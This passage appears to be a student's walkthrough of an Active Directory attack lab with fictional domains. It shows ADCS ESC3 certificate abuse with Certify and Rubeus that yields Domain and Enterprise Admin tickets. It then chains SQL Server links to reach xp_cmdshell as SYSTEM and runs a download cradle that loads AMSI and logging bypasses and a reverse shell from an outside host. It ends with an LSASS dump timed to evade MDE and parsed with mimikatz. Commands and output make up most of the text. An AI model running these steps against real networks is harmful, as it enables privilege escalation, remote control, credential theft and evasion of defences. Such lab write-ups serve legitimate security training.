+MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
+cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NzMxMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqWezM7mzY46y45ZJ5jrwu2fApbLw
+NKC4VlUSf5Uk8em09/XOmXgqmdTlqmU8gImIoGhRc0Mwynsz9raBtqvg91BaJlTE
+vWC4xbAi2DZFBkCUj00J3aHcVkyFWYzJFoCYOteEeN607feK1CEOSGcHl81dmkJm
+x4fWeDo5/53oHTqFkKpyv9dTY8E4S20W4CyXE8G+5Jom94Oq8jRNU9zjwbLxG2yv
+Qudmq0cVzEAwvI45UAVSPlsqL4TEdtoNuf3x3Y1ofrw/1Nr24idQ5UZj4a4YHoEx
+zcK45cMVjGFNvnp/rYHPnjyannXm2cpowSxr/UXeuc+JM6BaJBzTQnpX1QIDAQAB
+o4IDBDCCAwAwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUIheGocofMn2jhhyaC
+n65RgvL2fYE/guHdfLntDQIBZAIBBTAVBgNVHSUEDjAMBgorBgEEAYI3FAIBMA4G
+A1UdDwEB/wQEAwIHgDAdBgkrBgEEAYI3FQoEEDAOMAwGCisGAQQBgjcUAgEwHQYD
+VR0OBBYEFN/oeZzgW0Cyd9gKId7VH4S1IuylMB8GA1UdIwQYMBaAFNH+jQqn+rQy
+nzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NO
+PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
+dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
+BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1N
+Q09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
+U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/
+Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
+b3JpdHkwQAYDVR0RBDkwN6A1BgorBgEEAYI3FAIDoCcMJXN0dWRlbnQ3MzFAZG9s
+bGFyY29ycC5tb25leWNvcnAubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
+AYI3GQIBoDAELlMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2ODg2
+NDgtMjA2MTEwDQYJKoZIhvcNAQELBQADggEBAMOt7gWkjQNxxhimtXX1Zr16L2yH
+2/UVMWEw6dggPuQaRGMC4Dy0XfO13ONgiI5d2yOkADJqptAOtGF59GtvZ8UbbIA2
+jo/JzVK/I4Y7wE7Chj6MoRpc/mbmpolTVRe3wvjvgPc13zrhLq6zq1ozCwt80rGO
+IM8rUo5c1y/nLiElUWrrSdYd+xkfgglAf1t9bfDKeoyAmbF7Lg7pNFyT/YzRvgKJ
+1PQdm98pzj0IDetskUGQ1mWKneJGqzchHL7/89juQzBkpuD3cYwzWcSpmf+pJ5NY
+QdRIxYbqC3J2hlRJRjw7gnRZbiD1j+55iLfeHQXg2qL5tbs5XBflfF4jOsA=
+-----END CERTIFICATE-----
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+Like earlier, save the certificate text to esc3.pem and convert to pfx. Let's keep using SecretPass@123 as 
+the export password
+
+* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
+
+Now we can use the Enrollment Agent Certificate to request a certificate for DA from the template 
+SmartCardEnrollment-Users:
+
+* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
+
+```
+ v1.0.0
+[*] Action: Request a Certificates
+[*] Current user context : dcorp\student731
+[*] Template : SmartCardEnrollment-Users
+[*] On Behalf Of : dcorp\administrator
+```
+
+Once again, save the certificate text to esc3-DA.pem and convert the pem to pfx. Still using 
+SecretPass@123 as the export password:
+
+* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
+
+Use the esc3-DA created above with Rubeus to request a TGT for DA
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
+```
+[snip]
+[*] Action: Ask TGT
+[*] Using PKINIT with etype rc4_hmac and subject: CN=studentx, CN=Users, 
+DC=dollarcorp, DC=moneycorp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 
+'dollarcorp.moneycorp.local\administrator'
+[+] TGT request successful!
+```
+
+Check if we actually have DA privileges now
+
+* C:\AD\Tools>winrs -r:dcorp-dc cmd /c set username
+```
+USERNAME=administrator
+```
+
+To escalate to Enterprise Admin, we just need to make changes to request to the SmartCardEnrollment-Users template and Rubeus. Please note that we are using '/onbehalfof: mcorp\administrator' here
+
+* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
+
+Convert the pem to esc3-EA.pfx using openssl and use the pfx with Rubeus
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator / certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
+
+Finally, access mcorp-dc!
+
+* C:\AD\Tools> winrs -r:mcorp-dc cmd /c set username
+``` 
+USERNAME=administrator
+``` 
+
+### Learning Objective 22:
+```
+• Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
+```
+
+Let’s start with enumerating SQL servers in the domain and if studentx has privileges to connect to any 
+of them. 
+We can use PowerUpSQL module for that. Run the below command from a PowerShell session started using Invisi-Shell
+
+* PS C:\AD\Tools\PowerUpSQL-master> Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
+* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+```
+VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
+VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
+VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.
+
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 1776
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 15.0.2000.5
+SQLServerMajorVersion  : 2019
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student731
+IsSysadmin             : No
+ActiveSessions         : 1
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 1776
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 15.0.2000.5
+SQLServerMajorVersion  : 2019
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student731
+IsSysadmin             : No
+ActiveSessions         : 1
+```
+
+So, we can connect to dcorp-mssql. Using HeidiSQL client, let’s login to dcorp-mssql using windows 
+authentication of studentx. After login, enumerate linked databases on dcorp-mssql
+
+enumerate linked databases on dcorp-mssql
+
+We can also use Get-SQLServerLinkCrawl for crawling the database links automatically:
+
+* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
+```
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: DCORP-MSSQL
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL
+VERBOSE:  - Link Login: dcorp\student731
+VERBOSE:  - Link IsSysAdmin: 0
+VERBOSE:  - Link Count: 1
+VERBOSE:  - Links on this server: DCORP-SQL1
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: DCORP-SQL1
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
+VERBOSE:  - Link Login: dblinkuser
+VERBOSE:  - Link IsSysAdmin: 0
+VERBOSE:  - Link Count: 1
+VERBOSE:  - Links on this server: DCORP-MGMT
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: DCORP-MGMT
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
+VERBOSE:  - Link Login: sqluser
+VERBOSE:  - Link IsSysAdmin: 0
+VERBOSE:  - Link Count: 1
+VERBOSE:  - Links on this server: EU-SQL37.EU.EUROCORP.LOCAL
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: EU-SQL37
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL37.EU.EUROCORP.LOCAL
+VERBOSE:  - Link Login: sa
+VERBOSE:  - Link IsSysAdmin: 1
+VERBOSE:  - Link Count: 0
+VERBOSE:  - Links on this server:
+
+
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student731
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL37.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL37
+CustomQuery :
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+``` 
+
+Sweet! We have sysadmin on eu-sql server!
+
+If xp_cmdshell is enabled (or RPC out is true - which is set to false in this case), it is possible to execute commands on eu-sql using linked databases. 
+To avoid dealing with a large number of quotes and escapes, we can use the following command
+
+* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
+```
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student731
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL37.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL37
+CustomQuery : {USERNAME=SYSTEM, }
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+Create Invoke-PowerShellTcpEx.ps1:
+
+Create a copy of Invoke-PowerShellTcp.ps1 and rename it to Invoke-PowerShellTcpEx.ps1.
+
+Open Invoke-PowerShellTcpEx2.ps1 in PowerShell ISE (Right click on it and click Edit).
+
+Add "Power -Reverse -IPAddress 172.16.100.31 -Port 443" (without quotes) to the end of the file.
+
+Let's try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener
+
+* C:\AD\Tools> C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+
+* PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.31/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.31/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.31/Invoke-PowerShellTcpEx2.ps1)"''' -QueryTarget eu-sql37
+```
+listening on [any] 443 ...
+172.16.15.17: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [172.16.100.31] from (UNKNOWN) [172.16.15.17] 50509: NO_DATA
+Windows PowerShell running as user SYSTEM on EU-SQL37
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+```
+
+* PS C:\Windows\system32> $env:username
+```
+SYSTEM
+```
+* PS C:\Windows\system32> $env:computername
+```
+EU-SQL37
+```
+
+## Learning Objective 23:
+```
+• Compromise eu-sqlx again. Use opsec friendly alternatives to bypass MDE and MDI.
+```
+
+Continuing from the previous Learning Objective, we have ability to run commands as SYSTEM on eu-sql37.
+This is perfect to leverage to perfrom an LSASS dump to further gain persistent credential access to the machine. 
+To dump the memory of LSASS process, we can begin by leveraging minidumpdotnet as it is undetected by AV / MDE since it uses a custom implementation of the MiniDumpWriteDump() API call.
+
+### Tools Transfer and Execution
+Downloads over HTTP increase the chances of detection chained with other risky actions so we perfrom execution from an SMB share. We serve the minidumpdotnet and FindLSASSPID (to enumerate LSASS PID) on our studentVM share named - studentsharex (C:\AD\Tool\studentsharex). On the student VM, create an SMB share called - studentsharex with the following configuration: Allow Everyone ‘Read amd Write’ permissions on the share.
+
+![alt text](image-51.png)
+
+* C:\AD\Tools> copy C:\AD\Tools\minidumpdotnet.exe \\dcorp-student731\studentshare731
+* C:\AD\Tools> copy C:\AD\Tools\FindLSASSPID.exe \\dcorp-student731\studentshare731
+
+### LSASS DUMP using Custom APIs
+Next, begin by performing SQL crawl xp_cmdshell execution on eu-sql37 to enumerate the LSASS PID 
+using FindLSASSPID.exe. Start a PowerShell session using InvisiShell, import PowerUpSQL and run the 
+following command
+
+* C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+* PS C:\AD\Tools> Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
+* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student731.dollarcorp.moneycorp.local\studentshare731\FindLSASSPID.exe''' -QueryTarget eu-sql37
+```
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student731
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL37.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL37
+CustomQuery : {The network path was not found., }
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+To break a detection chain, we will run benign queries. In case of MDE, in our experience waiting for 
+about 10 minutes also helps in avoiding detection.
+
+* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql37
+
+```
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student731
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL37.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL37
+CustomQuery : System.Data.DataRow
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+We can now perform an LSASS dump using the minidumpdotnet tool and save it to the studentshare731.
+NOTE: Performing an LSASS dump directly on disk on eu-sql can cause the .dmp file to be corrupted as 
+EDRs can sometimes mangle the .dmp file when written on disk.
+
+* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-studentx.dollarcorp.moneycorp.local\studentsharex\minidumpdotnet.exe 712 \\dcorp-student731.dollarcorp.moneycorp.local\studentsharex731\monkeyx.dmp ''' -QueryTarget eu-sql37
+
+```
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student731
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL37.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL37
+CustomQuery : {The network path was not found., }
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL37.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+``` 
+
+Note that since the memory dump is being written to a fileshare, you may need to wait for up to 10 minutes. 
+The dump file size will initially be 0KB but eventually be something approximately 10MB. 
+
+Perform another benign query for safe measure to break any detection chain
+
+* PS C:\AD\Tools> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget eu-sql37
+
+
+Back on our studentvm we can now begin to parse the exfiltrated LSASS minidump (monkey.dmp) using 
+mimikatz as follows. Run the below command from an elevated shell (Run as administrator):
+NOTE: If you encounter errors parsing the minidump file, most likely your student VM memory is full. 
+Attempt a quick fix by logging in and out of the student VM. Also, turn off Windows Defender on the 
+student VM.
+
+* C:\Windows\System32> C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentsharex\monkey.dmp" "sekurlsa::ekeys" "exit"
